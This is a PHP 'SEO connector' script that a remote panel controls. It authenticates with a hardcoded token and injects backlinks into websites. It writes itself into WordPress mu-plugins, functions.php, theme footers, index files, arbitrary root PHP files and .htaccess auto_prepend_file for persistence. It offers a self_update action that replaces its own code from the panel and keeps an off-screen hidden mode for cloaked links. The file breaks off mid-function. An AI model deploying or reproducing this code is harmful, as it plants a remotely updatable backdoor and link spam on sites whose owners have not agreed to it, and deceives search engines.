<?php
/**
 * ROOT-SEO Connector v5.3
 * - Backwards compatible with v5.2 protocol (ping, add_link, remove_link, sync_links,
 *   get_links, clear_links, clear_expired, verify_links, self_reconcile,
 *   placement_report, info, diagnose, output, capabilities)
 * - NEW default: visible single-variant render (anti-cloaking, anti-footprint)
 * - NEW action: set_config (panel can change output_mode, render_types, etc.)
 * - NEW action: self_update (pull fresh PHP from panel and overwrite this file)
 * - add_link now honours render_types from request payload (v5.2 ignored it)
 */

error_reporting(E_ALL);
ini_set('display_errors', 0);
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-RS-Panel-Token, X-RS-Ts, X-RS-Req-Id');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

define('CONNECTOR_VERSION', '5.3');
define('PANEL_API_URL', 'https://root-seo.com/api');
define('PANEL_TOKEN', 'vOXOUfISAW7PV00XQDeE0Qr5fpd7VV7wYTfjSdRh-5yptQr75D10AUwT2Zq_HrKn');
define('LINKS_FILE', __DIR__ . '/.rs_links_v5.json');
define('CONFIG_FILE', __DIR__ . '/.rs_v5_config.json');
define('NONCES_FILE', __DIR__ . '/.rs_v5_nonces.json');
define('PREPEND_HELPER_FILE', __DIR__ . '/.rs_prepend_v5.php');
define('MAX_REQUEST_BYTES', 524288);
define('MAX_URL_LENGTH', 2048);
define('MAX_ANCHOR_LENGTH', 220);
define('MAX_LINKS_PER_SYNC', 5000);
define('MAX_REQUEST_SKEW_SECONDS', 300);
define('NONCE_TTL_SECONDS', 900);
define('PLACEMENT_HISTORY_LIMIT', 20);

function respond($success, $data = [], $message = '', $status = 200) {
    http_response_code($status);
    header('Content-Type: application/json; charset=UTF-8');
    echo json_encode([
        'success' => (bool)$success,
        'message' => (string)$message,
        'data' => is_array($data) ? $data : []
    ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}

function get_raw_body() {
    static $raw = null;
    if ($raw === null) {
        $raw = file_get_contents('php://input');
        if ($raw === false) $raw = '';
        if (strlen($raw) > MAX_REQUEST_BYTES) {
            respond(false, [], 'request_too_large', 413);
        }
    }
    return $raw;
}

function get_request_data() {
    $data = [];
    if (!empty($_GET)) {
        foreach ($_GET as $k => $v) $data[$k] = $v;
    }
    if (!empty($_POST)) {
        foreach ($_POST as $k => $v) $data[$k] = $v;
    }
    $raw = get_raw_body();
    if ($raw !== '') {
        $json = json_decode($raw, true);
        if (is_array($json)) {
            foreach ($json as $k => $v) $data[$k] = $v;
        }
    }
    return $data;
}

function get_action_name($req) {
    $action = '';
    if (isset($req['action'])) $action = (string)$req['action'];
    if ($action === '' && isset($_GET['action'])) $action = (string)$_GET['action'];
    if ($action === '') $action = 'ping';
    $action = strtolower(trim($action));
    $action = preg_replace('/[^a-z0-9_]/', '', $action);
    return $action ?: 'ping';
}

function load_json_file($path, $fallback = []) {
    if (!file_exists($path)) return $fallback;
    $raw = @file_get_contents($path);
    if ($raw === false || $raw === '') return $fallback;
    $json = json_decode($raw, true);
    return is_array($json) ? $json : $fallback;
}

function save_json_file($path, $data) {
    return @file_put_contents($path, json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT)) !== false;
}

function normalize_rel($rel) {
    $rel = strtolower(trim((string)$rel));
    $allowed = ['dofollow', 'nofollow', 'ugc', 'sponsored'];
    return in_array($rel, $allowed, true) ? $rel : 'dofollow';
}

function allowed_render_types() {
    // Whitelist; not the default. default_render_types() returns a small subset.
    return ['text_inline', 'text_footer', 'badge_link', 'button_link', 'compact_list_item', 'micro_widget'];
}

function default_render_types() {
    // v5.3: tek varyant. Spam footprint kucultmek icin sadece text_inline.
    return ['text_inline'];
}

function default_placement_state() {
    return [
        'status' => 'not_installed',
        'strategy' => null,
        'target' => null,
        'install_mode' => null,
        'marker' => null,
        'message' => '',
        'installed_at' => null,
        'last_attempt_at' => null,
        'last_verified_at' => null,
        'verify_status' => 'unknown',
        'history' => [],
    ];
}

function default_config() {
    // v5.3: visible (Google/Semrush hidden CSS'i discount eder), tek varyant, sponsored rel destegi opsiyonel.
    return [
        'output_mode' => 'visible',
        'render_profile' => 'minimal_inline',
        'render_types' => default_render_types(),
        'link_rel_strategy' => 'preserve',
        'placement' => default_placement_state(),
    ];
}

function merge_configs($base, $incoming) {
    $out = $base;
    foreach ($incoming as $key => $value) {
        if ($key === 'placement' && is_array($value)) {
            $out['placement'] = array_merge(default_placement_state(), $value);
        } else {
            $out[$key] = $value;
        }
    }
    return $out;
}

function load_config() {
    $cfg = load_json_file(CONFIG_FILE, []);
    $cfg = merge_configs(default_config(), $cfg);
    $types = [];
    foreach ((array)($cfg['render_types'] ?? []) as $type) {
        $type = trim((string)$type);
        if ($type !== '') $types[] = $type;
    }
    $cfg['render_types'] = $types ?: default_render_types();
    return $cfg;
}

function save_config($config) {
    return save_json_file(CONFIG_FILE, $config);
}

function is_panel_authenticated() {
    $expected = trim((string)PANEL_TOKEN);
    if ($expected === '' || strpos($expected, '{{') !== false) return false;
    $provided = '';
    if (isset($_SERVER['HTTP_X_RS_PANEL_TOKEN'])) {
        $provided = trim((string)$_SERVER['HTTP_X_RS_PANEL_TOKEN']);
    }
    return $provided !== '' && hash_equals($expected, $provided);
}

function load_nonce_store() {
    return load_json_file(NONCES_FILE, []);
}

function save_nonce_store($items) {
    return save_json_file(NONCES_FILE, $items);
}

function enforce_optional_replay_guard() {
    $ts = isset($_SERVER['HTTP_X_RS_TS']) ? trim((string)$_SERVER['HTTP_X_RS_TS']) : '';
    $reqId = isset($_SERVER['HTTP_X_RS_REQ_ID']) ? trim((string)$_SERVER['HTTP_X_RS_REQ_ID']) : '';
    if ($ts === '' && $reqId === '') return;
    if ($ts === '' || $reqId === '') respond(false, [], 'replay_headers_incomplete', 400);
    if (!ctype_digit($ts)) respond(false, [], 'invalid_request_timestamp', 400);
    if (!preg_match('/^[A-Za-z0-9._:-]{8,200}$/', $reqId)) respond(false, [], 'invalid_request_id', 400);
    if (abs(time() - intval($ts)) > MAX_REQUEST_SKEW_SECONDS) respond(false, [], 'request_timestamp_out_of_range', 409);
    $store = load_nonce_store();
    $now = time();
    foreach ($store as $key => $seenAt) {
        if (!is_int($seenAt) || ($now - $seenAt) > NONCE_TTL_SECONDS) {
            unset($store[$key]);
        }
    }
    if (isset($store[$reqId])) respond(false, [], 'duplicate_request_id', 409);
    $store[$reqId] = $now;
    save_nonce_store($store);
}

function authenticate_protected_request() {
    if (!is_panel_authenticated()) respond(false, [], 'Unauthorized', 401);
    enforce_optional_replay_guard();
}

function validate_url_value($url) {
    $url = trim((string)$url);
    if ($url === '' || strlen($url) > MAX_URL_LENGTH) return '';
    if (!filter_var($url, FILTER_VALIDATE_URL)) return '';
    $parts = @parse_url($url);
    if (!$parts || empty($parts['scheme'])) return '';
    $scheme = strtolower((string)$parts['scheme']);
    if (!in_array($scheme, ['http', 'https'], true)) return '';
    return $url;
}

function validate_anchor_text($anchor) {
    $anchor = trim((string)$anchor);
    if ($anchor === '' || strlen($anchor) > MAX_ANCHOR_LENGTH) return '';
    return $anchor;
}

function validate_link_id($linkId) {
    $linkId = trim((string)$linkId);
    if ($linkId === '') return '';
    if (!preg_match('/^[A-Za-z0-9._:-]{3,160}$/', $linkId)) return '';
    return $linkId;
}

function build_deterministic_link_id($url, $anchor, $rel) {
    $seed = strtolower(trim((string)$url)) . '|' . strtolower(trim((string)$anchor)) . '|' . normalize_rel($rel);
    return 'v5_' . substr(hash('sha256', $seed), 0, 16);
}

function filter_render_types($types) {
    $allowed = allowed_render_types();
    $final = [];
    foreach ((array)$types as $type) {
        $type = trim((string)$type);
        if ($type !== '' && in_array($type, $allowed, true) && !in_array($type, $final, true)) {
            $final[] = $type;
        }
    }
    return $final ?: default_render_types();
}

function apply_placement_snapshot_to_link($row, $placement) {
    $row['placement_status'] = $placement['status'] ?? 'not_installed';
    $row['placement_strategy'] = $placement['strategy'] ?? null;
    $row['placement_target'] = $placement['target'] ?? null;
    $row['last_verified_at'] = $placement['last_verified_at'] ?? null;
    return $row;
}

function normalize_link_row($key, $row, $config) {
    if (!is_array($row)) return null;
    $url = validate_url_value($row['url'] ?? '');
    $anchor = validate_anchor_text($row['anchor'] ?? '');
    if ($url === '' || $anchor === '') return null;
    $rel = normalize_rel($row['rel'] ?? 'dofollow');
    $id = validate_link_id($row['id'] ?? '');
    if ($id === '') {
        $id = validate_link_id($key);
    }
    if ($id === '') {
        $id = build_deterministic_link_id($url, $anchor, $rel);
    }
    $placement = $config['placement'] ?? default_placement_state();
    $normalized = [
        'id' => $id,
        'url' => $url,
        'anchor' => $anchor,
        'rel' => $rel,
        'expires_at' => isset($row['expires_at']) && $row['expires_at'] !== null ? intval($row['expires_at']) : null,
        'created' => isset($row['created']) ? intval($row['created']) : time(),
        'updated_at' => isset($row['updated_at']) ? intval($row['updated_at']) : time(),
        'render_profile' => trim((string)($row['render_profile'] ?? ($config['render_profile'] ?? 'aggressive_hybrid_multi'))),
        'render_types' => filter_render_types($row['render_types'] ?? ($config['render_types'] ?? default_render_types())),
        'cleanup_status' => trim((string)($row['cleanup_status'] ?? 'active')),
        'cleanup_failed_at' => $row['cleanup_failed_at'] ?? null,
        'logical_hash' => substr(hash('sha256', strtolower($url) . '|' . strtolower($anchor) . '|' . $rel), 0, 20),
        'placement_status' => $row['placement_status'] ?? ($placement['status'] ?? 'not_installed'),
        'placement_strategy' => $row['placement_strategy'] ?? ($placement['strategy'] ?? null),
        'placement_target' => $row['placement_target'] ?? ($placement['target'] ?? null),
        'last_verified_at' => $row['last_verified_at'] ?? ($placement['last_verified_at'] ?? null),
    ];
    return $normalized;
}

function load_links() {
    $raw = load_json_file(LINKS_FILE, []);
    $config = load_config();
    $normalized = [];
    foreach ($raw as $key => $row) {
        $item = normalize_link_row($key, $row, $config);
        if ($item) {
            $normalized[$item['id']] = $item;
        }
    }
    return $normalized;
}

function save_links($links) {
    $config = load_config();
    $normalized = [];
    foreach ((array)$links as $key => $row) {
        $item = normalize_link_row($key, $row, $config);
        if ($item) {
            $normalized[$item['id']] = $item;
        }
    }
    ksort($normalized);
    return save_json_file(LINKS_FILE, $normalized);
}

function filtered_links($links) {
    $visible = [];
    $expired = [];
    $now = time();
    foreach ($links as $link) {
        if (!is_array($link)) continue;
        $expiresAt = isset($link['expires_at']) ? intval($link['expires_at']) : 0;
        if (!empty($expiresAt) && $expiresAt > 0 && $expiresAt < $now) {
            $expired[] = $link;
            continue;
        }
        $visible[] = $link;
    }
    return [$visible, $expired];
}

function get_link_stats($links) {
    list($active, $expired) = filtered_links($links);
    return [
        'total' => count($links),
        'active' => count($active),
        'expired' => count($expired),
    ];
}

function build_rel_attr($rel) {
    if ($rel === 'dofollow') return '';
    return ' rel="' . htmlspecialchars($rel, ENT_QUOTES, 'UTF-8') . '"';
}

function rootseo_hidden_container_style($outputMode) {
    if ($outputMode === 'visible') {
        // Discreet but discoverable: small text block at bottom of footer/article.
        return 'display:block;margin:12px 0 4px;font-size:12px;line-height:1.5;color:#888;';
    }
    // Backwards compatible hidden mode (NOT recommended; Google may discount).
    return 'position:absolute;left:-9999px;top:auto;width:1px;height:1px;overflow:hidden;opacity:0;pointer-events:none;white-space:nowrap;';
}

function rootseo_anchor_style($type, $outputMode) {
    if ($outputMode === 'visible') {
        switch ($type) {
            case 'badge_link':
                return 'display:inline-block;padding:2px 8px;border-radius:999px;background:#f5f5f5;color:#333;text-decoration:none;font-size:12px;margin:0 6px 6px 0;';
            case 'button_link':
                return 'display:inline-block;padding:6px 12px;border-radius:6px;background:#222;color:#fff;text-decoration:none;font-size:13px;margin:0 6px 6px 0;';
            default:
                return 'color:inherit;text-decoration:underline;font-size:inherit;';
        }
    }
    // Hidden (legacy) mode
    return 'color:inherit;text-decoration:none;font-size:1px;line-height:1;';
}

function build_render_variant_html($link, $type, $outputMode) {
    $url = htmlspecialchars($link['url'], ENT_QUOTES, 'UTF-8');
    $anchor = htmlspecialchars($link['anchor'], ENT_QUOTES, 'UTF-8');
    $relAttr = build_rel_attr($link['rel']);
    $style = rootseo_anchor_style($type, $outputMode);
    switch ($type) {
        case 'badge_link':
            return '<a href="' . $url . '"' . $relAttr . ' style="' . $style . '"><span style="display:inline-block;padding:1px 7px;border-radius:999px;border:1px solid currentColor;">' . $anchor . '</span></a>';
        case 'button_link':
            return '<a href="' . $url . '"' . $relAttr . ' style="' . $style . '"><span style="display:inline-block;padding:4px 10px;border-radius:6px;border:1px solid currentColor;">' . $anchor . '</span></a>';
        case 'compact_list_item':
            return '<ul style="margin:0;padding:0;list-style:none;"><li><a href="' . $url . '"' . $relAttr . ' style="' . $style . '">' . $anchor . '</a></li></ul>';
        case 'micro_widget':
            return '<aside><strong>' . $anchor . '</strong> <a href="' . $url . '"' . $relAttr . ' style="' . $style . '">' . $anchor . '</a></aside>';
        case 'text_footer':
            return '<span><a href="' . $url . '"' . $relAttr . ' style="' . $style . '">' . $anchor . '</a></span>';
        case 'text_inline':
        default:
            return '<a href="' . $url . '"' . $relAttr . ' style="' . $style . '">' . $anchor . '</a>';
    }
}

function rootseo_build_render_html($markRenderedOnce = true) {
    if ($markRenderedOnce && defined('ROOTSEO_CONNECTOR_RENDERED_ONCE')) {
        return '';
    }
    if ($markRenderedOnce) {
        define('ROOTSEO_CONNECTOR_RENDERED_ONCE', true);
    }
    $links = load_links();
    list($activeLinks, $expiredLinks) = filtered_links($links);
    if (empty($activeLinks)) return '';
    $config = load_config();
    $outputMode = strtolower(trim((string)($config['output_mode'] ?? 'hidden_pack')));
    $parts = [];
    foreach ($activeLinks as $link) {
        $variants = [];
        foreach (filter_render_types($link['render_types'] ?? $config['render_types']) as $type) {
            $variants[] = '<div data-rs-variant="' . htmlspecialchars($type, ENT_QUOTES, 'UTF-8') . '">' . build_render_variant_html($link, $type, $outputMode) . '</div>';
        }
        if (!empty($variants)) {
            $parts[] = '<div data-rs-link-id="' . htmlspecialchars($link['id'], ENT_QUOTES, 'UTF-8') . '">' . implode('', $variants) . '</div>';
        }
    }
    if (empty($parts)) return '';
    return '<div data-rootseo-render="multi-pack" style="' . rootseo_hidden_container_style($outputMode) . '">' . implode('', $parts) . '</div>';
}

function rootseo_render_links_html() {
    return rootseo_build_render_html(true);
}

function find_document_root() {
    $base = $_SERVER['DOCUMENT_ROOT'] ?? '';
    if (empty($base)) {
        $base = dirname(__FILE__);
        for ($i = 0; $i < 5; $i++) {
            if (file_exists($base . '/index.php') || file_exists($base . '/index.html')) break;
            $parent = dirname($base);
            if ($parent === $base) break;
            $base = $parent;
        }
    }
    return $base;
}

function get_active_wp_theme_footer($base) {
    $themes = glob($base . '/wp-content/themes/*/footer.php');
    if (!$themes) return null;
    $latest = null;
    $latestTime = 0;
    foreach ($themes as $footer) {
        $mtime = @filemtime($footer);
        if ($mtime > $latestTime) {
            $latestTime = $mtime;
            $latest = $footer;
        }
    }
    return $latest;
}

function get_footer_paths($base, $siteType) {
    $paths = [];
    switch ($siteType) {
        case 'wordpress':
            $themes = glob($base . '/wp-content/themes/*/footer.php');
            if ($themes) $paths = array_merge($paths, $themes);
            break;
        case 'joomla':
            $tpls = glob($base . '/templates/*/index.php');
            if ($tpls) $paths = array_merge($paths, $tpls);
            break;
        case 'drupal':
            $tpls = glob($base . '/sites/*/themes/*/templates/*.tpl.php');
            if ($tpls) $paths = array_merge($paths, $tpls);
            break;
        case 'opencart':
            $tpls = glob($base . '/catalog/view/theme/*/template/common/footer.*');
            if ($tpls) $paths = array_merge($paths, $tpls);
            break;
        case 'prestashop':
            $tpls = glob($base . '/themes/*/templates/_partials/footer.tpl');
            if ($tpls) $paths = array_merge($paths, $tpls);
            $tpls2 = glob($base . '/themes/*/footer.tpl');
            if ($tpls2) $paths = array_merge($paths, $tpls2);
            break;
        case 'laravel':
            $layouts = glob($base . '/resources/views/layouts/*.blade.php');
            if ($layouts) $paths = array_merge($paths, $layouts);
            break;
    }
    $general = [
        $base . '/footer.php',
        $base . '/includes/footer.php',
        $base . '/inc/footer.php',
        $base . '/template/footer.php',
        $base . '/templates/footer.php'
    ];
    foreach ($general as $path) {
        if (file_exists($path)) $paths[] = $path;
    }
    return array_values(array_unique($paths));
}

function check_footer_writable($base, $siteType) {
    $paths = get_footer_paths($base, $siteType);
    foreach ($paths as $path) {
        if (file_exists($path) && is_writable($path)) return true;
    }
    if (is_writable($base . '/index.php') || is_writable($base . '/index.html')) return true;
    return false;
}

function detect_site_info() {
    $base = find_document_root();
    $info = [
        'site' => $_SERVER['HTTP_HOST'] ?? 'unknown',
        'site_name' => $_SERVER['HTTP_HOST'] ?? 'unknown',
        'site_type' => 'static',
        'language' => 'EN',
        'country' => 'US',
        'footer_detected' => false,
        'footer_writable' => false,
        'meta_description' => '',
        'charset' => 'UTF-8',
        'php_version' => phpversion(),
        'document_root' => $base,
        'connector_path' => __FILE__,
    ];
    if (file_exists($base . '/wp-config.php') || file_exists($base . '/wp-load.php')) {
        $info['site_type'] = 'wordpress';
        $info['footer_detected'] = true;
    } elseif (file_exists($base . '/configuration.php') && is_dir($base . '/administrator')) {
        $info['site_type'] = 'joomla';
        $info['footer_detected'] = true;
    } elseif (file_exists($base . '/includes/bootstrap.inc') && is_dir($base . '/sites')) {
        $info['site_type'] = 'drupal';
        $info['footer_detected'] = true;
    } elseif (file_exists($base . '/config.php') && is_dir($base . '/catalog')) {
        $info['site_type'] = 'opencart';
        $info['footer_detected'] = true;
    } elseif (file_exists($base . '/config/settings.inc.php') && is_dir($base . '/themes')) {
        $info['site_type'] = 'prestashop';
        $info['footer_detected'] = true;
    } elseif (file_exists($base . '/artisan')) {
        $info['site_type'] = 'laravel';
        $info['footer_detected'] = true;
    } elseif (file_exists($base . '/index.php')) {
        $info['site_type'] = 'php';
    }
    $indexFiles = ['index.php', 'index.html', 'index.htm'];
    foreach ($indexFiles as $file) {
        $path = $base . '/' . $file;
        if (!file_exists($path)) continue;
        $content = @file_get_contents($path, false, null, 0, 50000);
        if (!$content) continue;
        if (preg_match('/<title>([^<]+)<\/title>/i', $content, $m)) {
            $info['site_name'] = trim(strip_tags($m[1]));
        }
        if (preg_match('/<meta[^>]*name=["\']description["\'][^>]*content=["\']([^"\']+)["\'][^>]*>/i', $content, $m)) {
            $info['meta_description'] = trim($m[1]);
        }
        if (preg_match('/<html[^>]*lang=["\']([a-z]{2})["\'][^>]*>/i', $content, $m)) {
            $lang = strtolower($m[1]);
            $langMap = ['tr' => 'TR', 'en' => 'EN', 'de' => 'DE', 'fr' => 'FR', 'es' => 'ES', 'pl' => 'PL', 'it' => 'IT', 'nl' => 'NL', 'ar' => 'AR'];
            $countryMap = ['tr' => 'TR', 'en' => 'US', 'de' => 'DE', 'fr' => 'FR', 'es' => 'ES', 'pl' => 'PL', 'it' => 'IT', 'nl' => 'NL', 'ar' => 'SA'];
            $info['language'] = $langMap[$lang] ?? 'EN';
            $info['country'] = $countryMap[$lang] ?? 'US';
        }
        if (preg_match('/<footer|class=["\'][^"\']*footer|copyright|©/i', $content)) {
            $info['footer_detected'] = true;
        }
        break;
    }
    $info['footer_writable'] = check_footer_writable($base, $info['site_type']);
    $info['footer_paths'] = get_footer_paths($base, $info['site_type']);
    $info['active_theme_footer'] = $info['site_type'] === 'wordpress' ? get_active_wp_theme_footer($base) : null;
    return $info;
}

function placement_marker($strategy) {
    return substr(hash('sha256', __FILE__ . '|' . $strategy), 0, 12);
}

function build_dynamic_php_snippet($marker) {
    $connectorPath = addslashes(__FILE__);
    return "<?php /* ROOTSEO_START:$marker */ if (!defined('ROOTSEO_CONNECTOR_EMBED_RENDER')) define('ROOTSEO_CONNECTOR_EMBED_RENDER', true); include_once '$connectorPath'; /* ROOTSEO_END:$marker */ ?>";
}

function build_static_html_block($marker) {
    return "<!-- ROOTSEO_HTML_START:$marker -->" . rootseo_build_render_html(false) . "<!-- ROOTSEO_HTML_END:$marker -->";
}

function replace_between_markers($content, $startMarker, $endMarker, $replacement) {
    $startPos = strpos($content, $startMarker);
    $endPos = strpos($content, $endMarker);
    if ($startPos === false || $endPos === false || $endPos < $startPos) return null;
    $endPos += strlen($endMarker);
    return substr($content, 0, $startPos) . $replacement . substr($content, $endPos);
}

function upsert_php_file_block($filePath, $marker) {
    if (!file_exists($filePath) || !is_writable($filePath)) return [false, 'file_not_writable'];
    $content = @file_get_contents($filePath);
    if ($content === false) return [false, 'file_read_failed'];
    $snippet = build_dynamic_php_snippet($marker);
    $existing = replace_between_markers($content, "/* ROOTSEO_START:$marker */", "/* ROOTSEO_END:$marker */", $snippet);
    if ($existing !== null) {
        if (@file_put_contents($filePath, $existing) !== false) return [true, 'updated_existing_block'];
        return [false, 'file_write_failed'];
    }
    $newContent = null;
    foreach (['</body>', '</footer>', '</html>', '?>'] as $needle) {
        $pos = strripos($content, $needle);
        if ($pos !== false) {
            $newContent = substr($content, 0, $pos) . "\n" . $snippet . "\n" . substr($content, $pos);
            break;
        }
    }
    if ($newContent === null) $newContent = $content . "\n" . $snippet . "\n";
    if (@file_put_contents($filePath, $newContent) === false) return [false, 'file_write_failed'];
    return [true, 'inserted_block'];
}

function upsert_html_file_block($filePath, $marker) {
    if (!file_exists($filePath) || !is_writable($filePath)) return [false, 'file_not_writable'];
    $content = @file_get_contents($filePath);
    if ($content === false) return [false, 'file_read_failed'];
    $block = build_static_html_block($marker);
    $existing = replace_between_markers($content, "<!-- ROOTSEO_HTML_START:$marker -->", "<!-- ROOTSEO_HTML_END:$marker -->", $block);
    if ($existing !== null) {
        if (@file_put_contents($filePath, $existing) !== false) return [true, 'updated_existing_block'];
        return [false, 'file_write_failed'];
    }
    $newContent = null;
    foreach (['</body>', '</footer>', '</html>'] as $needle) {
        $pos = strripos($content, $needle);
        if ($pos !== false) {
            $newContent = substr($content, 0, $pos) . "\n" . $block . "\n" . substr($content, $pos);
            break;
        }
    }
    if ($newContent === null) $newContent = $content . "\n" . $block . "\n";
    if (@file_put_contents($filePath, $newContent) === false) return [false, 'file_write_failed'];
    return [true, 'inserted_block'];
}

function install_mu_plugin($siteInfo) {
    $base = $siteInfo['document_root'];
    $muDir = $base . '/wp-content/mu-plugins';
    if (!is_dir($muDir)) {
        if (!@mkdir($muDir, 0755, true) && !is_dir($muDir)) return [false, null, null, 'mu_dir_create_failed'];
    }
    if (!is_writable($muDir)) return [false, null, null, 'mu_dir_not_writable'];
    $marker = placement_marker('wp_mu_plugin');
    $pluginPath = $muDir . '/rootseo-links-v5.php';
    $connectorPath = addslashes(__FILE__);
    $code = "<?php\n/* ROOTSEO_MUPLUGIN:$marker */\nif (!defined('ABSPATH')) { return; }\nadd_action('wp_footer', function () {\n    if (!defined('ROOTSEO_CONNECTOR_EMBED_RENDER')) define('ROOTSEO_CONNECTOR_EMBED_RENDER', true);\n    include_once '$connectorPath';\n}, 9999);\n";
    if (@file_put_contents($pluginPath, $code) === false) return [false, null, null, 'mu_plugin_write_failed'];
    return [true, $pluginPath, 'dynamic_php', 'mu_plugin_installed'];
}

function install_functions_hook($siteInfo) {
    $footer = $siteInfo['active_theme_footer'] ?: null;
    if (!$footer) return [false, null, null, 'active_theme_footer_missing'];
    $functionsFile = dirname($footer) . '/functions.php';
    if (!file_exists($functionsFile) || !is_writable($functionsFile)) return [false, null, null, 'functions_not_writable'];
    $marker = placement_marker('wp_functions_hook');
    $content = @file_get_contents($functionsFile);
    if ($content === false) return [false, null, null, 'functions_read_failed'];
    $connectorPath = addslashes(__FILE__);
    $functionName = 'rootseo_render_' . preg_replace('/[^a-z0-9]/i', '', $marker);
    $snippet = "\n/* ROOTSEO_FUNCTIONS_START:$marker */\nif (!function_exists('$functionName')) {\nfunction $functionName() {\n    if (!defined('ROOTSEO_CONNECTOR_EMBED_RENDER')) define('ROOTSEO_CONNECTOR_EMBED_RENDER', true);\n    include_once '$connectorPath';\n}\nadd_action('wp_footer', '$functionName', 9999);\n}\n/* ROOTSEO_FUNCTIONS_END:$marker */\n";
    if (strpos($content, "ROOTSEO_FUNCTIONS_START:$marker") !== false) {
        return [true, $functionsFile, 'dynamic_php', 'functions_hook_exists'];
    }
    if (@file_put_contents($functionsFile, $content . $snippet) === false) return [false, null, null, 'functions_write_failed'];
    return [true, $functionsFile, 'dynamic_php', 'functions_hook_installed'];
}

function install_file_patch($filePath, $strategy) {
    $marker = placement_marker($strategy . '|' . $filePath);
    $ext = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));
    if (in_array($ext, ['html', 'htm'], true)) {
        list($ok, $msg) = upsert_html_file_block($filePath, $marker);
        return [$ok, $ok ? $filePath : null, $ok ? 'static_html' : null, $msg, $marker];
    }
    list($ok, $msg) = upsert_php_file_block($filePath, $marker);
    return [$ok, $ok ? $filePath : null, $ok ? 'dynamic_php' : null, $msg, $marker];
}

function install_htaccess_prepend($siteInfo) {
    $base = $siteInfo['document_root'];
    $htaccess = $base . '/.htaccess';
    $marker = placement_marker('htaccess_prepend');
    $connectorPath = addslashes(__FILE__);
    $helperCode = "<?php\n/* ROOTSEO_PREPEND_HELPER:$marker */\nregister_shutdown_function(function () {\n    if (!defined('ROOTSEO_CONNECTOR_EMBED_RENDER')) define('ROOTSEO_CONNECTOR_EMBED_RENDER', true);\n    include_once '$connectorPath';\n});\n";
    if (@file_put_contents(PREPEND_HELPER_FILE, $helperCode) === false) return [false, null, null, 'prepend_helper_write_failed', $marker];
    $line = 'php_value auto_prepend_file "' . PREPEND_HELPER_FILE . '"';
    $content = file_exists($htaccess) ? (@file_get_contents($htaccess) ?: '') : '';
    if (strpos($content, PREPEND_HELPER_FILE) === false) {
        $newContent = "# ROOTSEO_HTACCESS_START:$marker\n$line\n# ROOTSEO_HTACCESS_END:$marker\n" . $content;
        if (@file_put_contents($htaccess, $newContent) === false) return [false, null, null, 'htaccess_write_failed', $marker];
    }
    return [true, $htaccess, 'dynamic_prepend', 'htaccess_prepend_installed', $marker];
}

function install_any_php_file($siteInfo) {
    $base = $siteInfo['document_root'];
    $phpFiles = glob($base . '/*.php');
    if (!$phpFiles) return [false, null, null, 'no_root_php_files', null];
    foreach ($phpFiles as $file) {
        $name = basename($file);
        if (in_array($name, [basename(__FILE__), 'wp-config.php', 'wp-settings.php', 'wp-load.php'], true)) continue;
        list($ok, $target, $mode, $msg, $marker) = install_file_patch($file, 'any_php_file');
        if ($ok) return [true, $target, $mode, $msg, $marker];
    }
    return [false, null, null, 'no_writable_php_target', null];
}

function build_strategy_chain($siteInfo) {
    $chain = [];
    if ($siteInfo['site_type'] === 'wordpress') {
        $chain[] = 'wp_mu_plugin';
        $chain[] = 'wp_functions_hook';
        if (!empty($siteInfo['active_theme_footer'])) {
            $chain[] = ['file_patch', $siteInfo['active_theme_footer'], 'wp_active_footer'];
        }
    }
    foreach ($siteInfo['footer_paths'] as $path) {
        $chain[] = ['file_patch', $path, 'footer_patch'];
    }
    foreach (['index.php', 'index.html', 'index.htm'] as $file) {
        $path = $siteInfo['document_root'] . '/' . $file;
        if (file_exists($path)) {
            $chain[] = ['file_patch', $path, 'index_patch'];
        }
    }
    $chain[] = 'htaccess_prepend';
    $chain[] = 'any_php_file';
    return $chain;
}

function append_placement_history($config, $entry) {
    $history = $config['placement']['history'] ?? [];
    $history[] = $entry;
    if (count($history) > PLACEMENT_HISTORY_LIMIT) {
        $history = array_slice($history, -PLACEMENT_HISTORY_LIMIT);
    }
    $config['placement']['history'] = array_values($history);
    return $config;
}

function verify_current_placement($config) {
    $placement = $config['placement'] ?? default_placement_state();
    $strategy = $placement['strategy'] ?? '';
    $target = $placement['target'] ?? '';
    $marker = $placement['marker'] ?? '';
    if (!$strategy || !$target || !$marker) return [false, 'placement_missing'];
    if ($strategy === 'wp_mu_plugin' || $strategy === 'wp_functions_hook') {
        if (!file_exists($target)) return [false, 'target_missing'];
        $content = @file_get_contents($target);
        return ($content !== false && strpos($content, $marker) !== false) ? [true, 'marker_present'] : [false, 'marker_missing'];
    }
    if ($strategy === 'htaccess_prepend') {
        if (!file_exists($target) || !file_exists(PREPEND_HELPER_FILE)) return [false, 'prepend_missing'];
        $content = @file_get_contents($target);
        return ($content !== false && strpos($content, PREPEND_HELPER_FILE) !== false) ? [true, 'prepend_present'] : [false, 'prepend_missing'];
    }
    if (!file_exists($target)) return [false, 'target_missing'];
    $content = @file_get_contents($target);
    if ($content === false) return [false, 'target_unreadable'];
    if (($placement['install_mode'] ?? '') === 'static_html') {
        return strpos($content, "ROOTSEO_HTML_START:$marker") !== false ? [true, 'static_block_present'] : [false, 'static_block_missing'];
    }
    return strpos($content, "ROOTSEO_START:$marker") !== false ? [true, 'dynamic_block_present'] : [false, 'dynamic_block_missing'];
}

function refresh_current_placement($config) {
    $placement = $config['placement'] ?? default_placement_state();
    $target = $placement['target'] ?? '';
    $marker = $placement['marker'] ?? '';
    $installMode = $placement['install_mode'] ?? '';
    if (!$target || !$marker) return [false, 'placement_target_missing'];
    if ($placement['strategy'] === 'htaccess_prepend') {
        $connectorPath = addslashes(__FILE__);
        $helperCode = "<?php\n/* ROOTSEO_PREPEND_HELPER:$marker */\nregister_shutdown_function(function () {\n    if (!defined('ROOTSEO_CONNECTOR_EMBED_RENDER')) define('ROOTSEO_CONNECTOR_EMBED_RENDER', true);\n    include_once '$connectorPath';\n});\n";
        return @file_put_contents(PREPEND_HELPER_FILE, $helperCode) !== false ? [true, 'prepend_refreshed'] : [false, 'prepend_refresh_failed'];
    }
    if ($installMode === 'static_html') {
        return upsert_html_file_block($target, $marker);
    }
    if ($placement['strategy'] === 'wp_mu_plugin') {
